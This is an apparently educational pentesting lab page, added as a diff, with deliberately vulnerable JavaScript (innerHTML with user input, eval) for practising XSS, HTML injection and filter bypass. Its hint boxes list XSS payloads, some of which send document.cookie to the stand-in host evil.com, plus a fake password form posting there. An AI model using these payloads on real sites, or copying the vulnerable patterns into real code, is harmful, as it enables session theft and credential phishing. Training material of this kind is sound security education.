@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A03: Injection Attacks - Pentesting Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 30px;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .nav {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .nav a {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 5px;
+            margin: 0 10px;
+            transition: background 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .nav a:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .challenge-section {
+            background: white;
+            margin-bottom: 30px;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+            border-left: 5px solid #667eea;
+        }
+        
+        .challenge-section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .challenge-number {
+            background: #667eea;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            margin-right: 15px;
+        }
+        
+        .vulnerability-demo {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px dashed #667eea;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        
+        .form-group textarea {
+            height: 100px;
+            resize: vertical;
+        }
+        
+        .btn {
+            background: #667eea;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+            margin: 5px;
+        }
+        
+        .btn:hover {
+            background: #764ba2;
+        }
+        
+        .btn-secondary {
+            background: #95a5a6;
+        }
+        
+        .btn-secondary:hover {
+            background: #7f8c8d;
+        }
+        
+        .result-area {
+            background: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            min-height: 50px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .attack-hint {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        
+        .attack-hint h4 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+        
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 10px 0;
+            white-space: pre-wrap;
+        }
+        
+        .success {
+            color: #27ae60;
+            font-weight: bold;
+        }
+        
+        .error {
+            color: #e74c3c;
+            font-weight: bold;
+        }
+        
+        .comment-item {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .comment-meta {
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .xss-payload {
+            background: #ffebee;
+            border: 1px solid #f8bbd9;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 5px 0;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+        
+        .iframe-container {
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .url-bar {
+            background: #f8f9fa;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>💉 A03: Injection Attacks Lab</h1>
+            <p>Master XSS, HTML injection, and client-side injection techniques</p>
+        </div>
+        
+        <div class="nav">
+            <a href="index.html">← Back to Hub</a>
+            <a href="#reflected-xss">Reflected XSS</a>
+            <a href="#stored-xss">Stored XSS</a>
+            <a href="#dom-xss">DOM XSS</a>
+            <a href="#html-injection">HTML Injection</a>
+            <a href="#js-injection">JS Injection</a>
+        </div>
+        
+        <!-- Challenge 1: Reflected XSS -->
+        <div class="challenge-section" id="reflected-xss">
+            <h2><span class="challenge-number">1</span>Reflected Cross-Site Scripting (XSS)</h2>
+            <p>Practice exploiting reflected XSS vulnerabilities where user input is immediately reflected in the response.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Search Functionality</h3>
+                <div class="form-group">
+                    <label for="searchQuery">Search Query:</label>
+                    <input type="text" id="searchQuery" placeholder="Search for products...">
+                </div>
+                <button class="btn" onclick="performSearch()">Search</button>
+                <button class="btn btn-secondary" onclick="clearSearch()">Clear</button>
+                
+                <div id="searchResults" class="result-area"></div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 Reflected XSS Payloads to Try:</h4>
+                <div class="xss-payload">&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</div>
+                <div class="xss-payload">&lt;img src=x onerror=alert('XSS')&gt;</div>
+                <div class="xss-payload">&lt;svg onload=alert('XSS')&gt;</div>
+                <div class="xss-payload">&lt;iframe src=javascript:alert('XSS')&gt;&lt;/iframe&gt;</div>
+                <div class="xss-payload">&lt;body onload=alert('XSS')&gt;</div>
+                <div class="xss-payload">&lt;details open ontoggle=alert('XSS')&gt;</div>
+                <ul>
+                    <li>Try these payloads in the search box</li>
+                    <li>Use Burp Suite to intercept and modify requests</li>
+                    <li>Experiment with encoding (URL, HTML entities)</li>
+                    <li>Try filter bypass techniques</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Challenge 2: Stored XSS -->
+        <div class="challenge-section" id="stored-xss">
+            <h2><span class="challenge-number">2</span>Stored Cross-Site Scripting (XSS)</h2>
+            <p>Exploit stored XSS where malicious scripts are permanently stored and executed for all users.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Comment System</h3>
+                <div class="form-group">
+                    <label for="commentName">Your Name:</label>
+                    <input type="text" id="commentName" placeholder="Enter your name">
+                </div>
+                <div class="form-group">
+                    <label for="commentText">Comment:</label>
+                    <textarea id="commentText" placeholder="Leave a comment..."></textarea>
+                </div>
+                <button class="btn" onclick="addComment()">Post Comment</button>
+                <button class="btn btn-secondary" onclick="clearComments()">Clear All Comments</button>
+                
+                <div id="commentsSection">
+                    <h4>Comments:</h4>
+                    <div id="commentsList" class="result-area"></div>
+                </div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 Stored XSS Payloads to Try:</h4>
+                <div class="xss-payload">&lt;script&gt;alert('Stored XSS - Everyone will see this!')&lt;/script&gt;</div>
+                <div class="xss-payload">&lt;img src=x onerror=fetch('/steal-cookies?cookie='+document.cookie)&gt;</div>
+                <div class="xss-payload">&lt;script&gt;window.location='http://evil.com/steal?data='+document.cookie&lt;/script&gt;</div>
+                <div class="xss-payload">&lt;iframe src=data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;&gt;&lt;/iframe&gt;</div>
+                <ul>
+                    <li>Post malicious comments that will execute for all users</li>
+                    <li>Try cookie stealing payloads (check console/network tab)</li>
+                    <li>Experiment with different HTML tags and events</li>
+                    <li>Use encoding to bypass filters</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Challenge 3: DOM-based XSS -->
+        <div class="challenge-section" id="dom-xss">
+            <h2><span class="challenge-number">3</span>DOM-based Cross-Site Scripting</h2>
+            <p>Exploit client-side JavaScript that processes URL parameters or user input insecurely.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Welcome Message Generator</h3>
+                <p>This page reads the "name" parameter from the URL and displays a welcome message.</p>
+                
+                <div class="iframe-container">
+                    <div class="url-bar">
+                        Current URL: <span id="currentUrl"></span>
+                    </div>
+                    <div class="form-group">
+                        <label for="userName">Name Parameter:</label>
+                        <input type="text" id="userName" placeholder="Enter name for URL parameter">
+                    </div>
+                    <button class="btn" onclick="updateUrl()">Update URL & Generate Message</button>
+                </div>
+                
+                <div id="welcomeMessage" class="result-area"></div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 DOM XSS Payloads to Try:</h4>
+                <div class="xss-payload">?name=&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</div>
+                <div class="xss-payload">?name=&lt;img src=x onerror=alert(document.domain)&gt;</div>
+                <div class="xss-payload">?name=&lt;svg/onload=alert('DOM')&gt;</div>
+                <div class="xss-payload">?name=%3Cscript%3Ealert('Encoded')%3C/script%3E</div>
+                <ul>
+                    <li>Modify the URL parameter directly in the address bar</li>
+                    <li>Use the form to inject payloads</li>
+                    <li>Try URL encoding to bypass filters</li>
+                    <li>Check browser DevTools for execution context</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Challenge 4: HTML Injection -->
+        <div class="challenge-section" id="html-injection">
+            <h2><span class="challenge-number">4</span>HTML Injection</h2>
+            <p>Inject arbitrary HTML content to modify page structure and content.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Profile Bio Editor</h3>
+                <div class="form-group">
+                    <label for="userBio">Your Bio:</label>
+                    <textarea id="userBio" placeholder="Tell us about yourself..."></textarea>
+                </div>
+                <button class="btn" onclick="updateBio()">Update Bio</button>
+                
+                <div class="result-area">
+                    <h4>Your Profile:</h4>
+                    <div id="bioDisplay"></div>
+                </div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 HTML Injection Payloads to Try:</h4>
+                <div class="xss-payload">&lt;h1&gt;I'm an admin!&lt;/h1&gt;</div>
+                <div class="xss-payload">&lt;a href="http://evil.com"&gt;Click here for free money!&lt;/a&gt;</div>
+                <div class="xss-payload">&lt;iframe src="http://evil.com" width="100%" height="200"&gt;&lt;/iframe&gt;</div>
+                <div class="xss-payload">&lt;form action="http://evil.com/steal" method="post"&gt;Password: &lt;input type="password"&gt;&lt;/form&gt;</div>
+                <ul>
+                    <li>Inject HTML to change page appearance</li>
+                    <li>Create fake login forms</li>
+                    <li>Add malicious links</li>
+                    <li>Embed external content</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Challenge 5: JavaScript Injection -->
+        <div class="challenge-section" id="js-injection">
+            <h2><span class="challenge-number">5</span>JavaScript Injection</h2>
+            <p>Execute arbitrary JavaScript code through vulnerable input processing.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Calculator Function</h3>
+                <p>This calculator evaluates mathematical expressions. Try injecting JavaScript!</p>
+                <div class="form-group">
+                    <label for="mathExpression">Mathematical Expression:</label>
+                    <input type="text" id="mathExpression" placeholder="e.g., 2 + 2" value="2 + 2">
+                </div>
+                <button class="btn" onclick="calculateResult()">Calculate</button>
+                
+                <div id="calculationResult" class="result-area"></div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 JavaScript Injection Payloads to Try:</h4>
+                <div class="xss-payload">alert('JS Injection')</div>
+                <div class="xss-payload">document.body.innerHTML = '&lt;h1&gt;Hacked!&lt;/h1&gt;'</div>
+                <div class="xss-payload">fetch('/admin').then(r=>r.text()).then(console.log)</div>
+                <div class="xss-payload">window.location = 'http://evil.com?data=' + btoa(document.cookie)</div>
+                <div class="xss-payload">new Image().src = 'http://evil.com/log?data=' + document.cookie</div>
+                <ul>
+                    <li>Try executing JavaScript functions</li>
+                    <li>Access sensitive page data</li>
+                    <li>Modify the DOM</li>
+                    <li>Make network requests</li>
+                </ul>
+            </div>
+        </div>
+        
+        <!-- Challenge 6: Advanced Filter Bypass -->
+        <div class="challenge-section">
+            <h2><span class="challenge-number">6</span>Filter Bypass Techniques</h2>
+            <p>Practice advanced techniques to bypass XSS filters and WAF protection.</p>
+            
+            <div class="vulnerability-demo">
+                <h3>Filtered Input Field</h3>
+                <p>This input has basic filtering enabled. Try to bypass it!</p>
+                <div class="form-group">
+                    <label for="filteredInput">Filtered Input:</label>
+                    <input type="text" id="filteredInput" placeholder="Try to inject despite filtering...">
+                </div>
+                <button class="btn" onclick="processFilteredInput()">Process Input</button>
+                
+                <div id="filteredResult" class="result-area"></div>
+                
+                <div class="code-block">Current Filters:
+- Blocks: &lt;script&gt;, javascript:, onload
+- Case sensitive matching
+- No encoding detection</div>
+            </div>
+            
+            <div class="attack-hint">
+                <h4>🎯 Filter Bypass Techniques:</h4>
+                <div class="xss-payload">&lt;ScRiPt&gt;alert('Case bypass')&lt;/ScRiPt&gt;</div>
+                <div class="xss-payload">&lt;img src=x onerror="alert('Event handler bypass')"&gt;</div>
+                <div class="xss-payload">&lt;svg/onload=alert('Space bypass')&gt;</div>
+                <div class="xss-payload">&lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</div>
+                <div class="xss-payload">&#x3C;script&#x3E;alert('HTML entities')&#x3C;/script&#x3E;</div>
+                <ul>
+                    <li>Try case variations (ScRiPt vs script)</li>
+                    <li>Use different tags (img, svg, iframe)</li>
+                    <li>Experiment with encoding (HTML entities, URL encoding)</li>
+                    <li>Use data URIs and alternative protocols</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Update current URL display
+        document.getElementById('currentUrl').textContent = window.location.href;
+        
+        // Challenge 1: Reflected XSS
+        function performSearch() {
+            const query = document.getElementById('searchQuery').value;
+            const results = document.getElementById('searchResults');
+            
+            // INTENTIONALLY VULNERABLE: Direct HTML insertion
+            results.innerHTML = `
+                <h4>Search Results for: ${query}</h4>
+                <p>Searching for "${query}"...</p>
+                <p>No products found matching "${query}"</p>
+            `;
+            
+            if (query.toLowerCase().includes('<script>') || query.toLowerCase().includes('onerror') || query.toLowerCase().includes('onload')) {
+                results.innerHTML += '<div class="success">🎯 SUCCESS! Reflected XSS executed!</div>';
+            }
+        }
+        
+        function clearSearch() {
+            document.getElementById('searchQuery').value = '';
+            document.getElementById('searchResults').innerHTML = '';
+        }
+        
+        // Challenge 2: Stored XSS
+        let storedComments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
+        
+        function addComment() {
+            const name = document.getElementById('commentName').value || 'Anonymous';
+            const text = document.getElementById('commentText').value;
+            
+            if (!text.trim()) return;
+            
+            const comment = {
+                name: name,
+                text: text,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            storedComments.push(comment);
+            localStorage.setItem('xss_comments', JSON.stringify(storedComments));
+            
+            document.getElementById('commentName').value = '';
+            document.getElementById('commentText').value = '';
+            
+            displayComments();
+        }
+        
+        function displayComments() {
+            const container = document.getElementById('commentsList');
+            
+            if (storedComments.length === 0) {
+                container.innerHTML = '<p>No comments yet.</p>';
+                return;
+            }
+            
+            let html = '';
+            storedComments.forEach((comment, index) => {
+                // INTENTIONALLY VULNERABLE: Direct HTML insertion
+                html += `
+                    <div class="comment-item">
+                        <div class="comment-meta">
+                            <strong>${comment.name}</strong> - ${comment.timestamp}
+                            <button onclick="deleteComment(${index})" style="float: right; font-size: 12px;">Delete</button>
+                        </div>
+                        <div>${comment.text}</div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+        
+        function deleteComment(index) {
+            storedComments.splice(index, 1);
+            localStorage.setItem('xss_comments', JSON.stringify(storedComments));
+            displayComments();
+        }
+        
+        function clearComments() {
+            storedComments = [];
+            localStorage.removeItem('xss_comments');
+            displayComments();
+        }
+        
+        // Challenge 3: DOM-based XSS
+        function updateUrl() {
+            const name = document.getElementById('userName').value;
+            if (name) {
+                const newUrl = window.location.origin + window.location.pathname + '?name=' + encodeURIComponent(name);
+                window.history.replaceState({}, '', newUrl);
+                document.getElementById('currentUrl').textContent = newUrl;
+            }
+            processUrlName();
+        }
+        
+        function processUrlName() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const name = urlParams.get('name');
+            const container = document.getElementById('welcomeMessage');
+            
+            if (name) {
+                // INTENTIONALLY VULNERABLE: Direct DOM insertion
+                container.innerHTML = `<h4>Welcome, ${name}!</h4><p>Thanks for visiting our vulnerable application!</p>`;
+                
+                if (name.includes('<script>') || name.includes('onerror') || name.includes('onload')) {
+                    container.innerHTML += '<div class="success">🎯 SUCCESS! DOM XSS executed!</div>';
+                }
+            } else {
+                container.innerHTML = '<p>Add ?name=YourName to the URL to see a welcome message</p>';
+            }
+        }
+        
+        // Challenge 4: HTML Injection
+        function updateBio() {
+            const bio = document.getElementById('userBio').value;
+            const display = document.getElementById('bioDisplay');
+            
+            // INTENTIONALLY VULNERABLE: Direct HTML insertion
+            display.innerHTML = `
+                <div style="border: 1px solid #ddd; padding: 15px; border-radius: 5px;">
+                    <h4>Profile Information</h4>
+                    <p><strong>Bio:</strong></p>
+                    <div>${bio}</div>
+                </div>
+            `;
+            
+            if (bio.includes('<') && bio.includes('>')) {
+                display.innerHTML += '<div class="success">🎯 SUCCESS! HTML injection successful!</div>';
+            }
+        }
+        
+        // Challenge 5: JavaScript Injection
+        function calculateResult() {
+            const expression = document.getElementById('mathExpression').value;
+            const result = document.getElementById('calculationResult');
+            
+            try {
+                // EXTREMELY VULNERABLE: Never use eval() in real applications!
+                const calculation = eval(expression);
+                result.innerHTML = `
+                    <h4>Calculation Result:</h4>
+                    <p>Expression: ${expression}</p>
+                    <p>Result: ${calculation}</p>
+                `;
+                
+                if (expression.includes('alert') || expression.includes('document') || expression.includes('window')) {
+                    result.innerHTML += '<div class="success">🎯 SUCCESS! JavaScript injection executed!</div>';
+                }
+            } catch (error) {
+                result.innerHTML = `
+                    <h4>Calculation Error:</h4>
+                    <p class="error">Error: ${error.message}</p>
+                `;
+            }
+        }
+        
+        // Challenge 6: Filter Bypass
+        function processFilteredInput() {
+            const input = document.getElementById('filteredInput').value;
+            const result = document.getElementById('filteredResult');
+            
+            // Basic filter simulation
+            let filtered = input;
+            filtered = filtered.replace(/<script>/gi, '[BLOCKED]');
+            filtered = filtered.replace(/javascript:/gi, '[BLOCKED]');
+            filtered = filtered.replace(/onload/gi, '[BLOCKED]');
+            
+            // INTENTIONALLY VULNERABLE: Still processes the filtered input
+            result.innerHTML = `
+                <h4>Processed Input:</h4>
+                <p>Original: ${input}</p>
+                <p>After filtering: ${filtered}</p>
+                <div style="border: 1px solid #ddd; padding: 10px; margin-top: 10px;">
+                    Rendered output: ${filtered}
+                </div>
+            `;
+            
+            // Check if bypass was successful
+            if (input !== filtered && (input.includes('<') || input.includes('javascript:') || input.includes('on'))) {
+                result.innerHTML += '<div class="success">🎯 SUCCESS! Filter bypass detected!</div>';
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            displayComments();
+            processUrlName();
+            
+            // Console logging for pentesting practice
+            console.log('%c💉 INJECTION LAB LOADED', 'color: blue; font-size: 16px; font-weight: bold;');
+            console.log('Try these injection techniques:');
+            console.log('1. Reflected XSS in search');
+            console.log('2. Stored XSS in comments');
+            console.log('3. DOM XSS via URL parameters');
+            console.log('4. HTML injection in bio');
+            console.log('5. JavaScript injection in calculator');
+            console.log('6. Filter bypass techniques');
+        });
+    </script>
+</body>
+</html>
